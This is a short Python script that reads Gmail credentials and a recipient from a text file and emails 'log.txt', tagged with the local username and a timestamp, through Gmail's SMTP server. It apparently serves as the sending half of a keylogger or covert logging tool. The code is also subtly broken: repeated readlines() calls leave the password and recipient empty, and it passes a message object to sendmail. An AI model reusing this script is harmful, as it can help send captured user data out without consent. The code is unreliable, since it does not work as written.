import smtplib
import os
import datetime

from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

username = os.getlogin()
server = smtplib.SMTP('smtp.gmail.com', 25)

server.ehlo()

with open('password.txt', 'r') as f:
    email = f.readlines()[0]
    password = f.readlines()[1]
    to = f.readlines()[2]

server.login(email, password)
current_time = datetime.datetime.now()

msg = MIMEMultipart()
msg['From'] = f'{username}-Logs'
msg['To'] = to
msg['Subject'] = f'Logging-{username}: {current_time}'

filename = 'log.txt'
attachment = open(filename, 'rb')

p = MIMEBase('application', 'octet-stream')
p.set_payload(attachment.read())

encoders.encode_base64(p)
p.add_header('Content-Disposition', f'attachement; filename={filename}')
msg.attach(p)

text = msg.as_string()
server.sendmail(email, to, msg)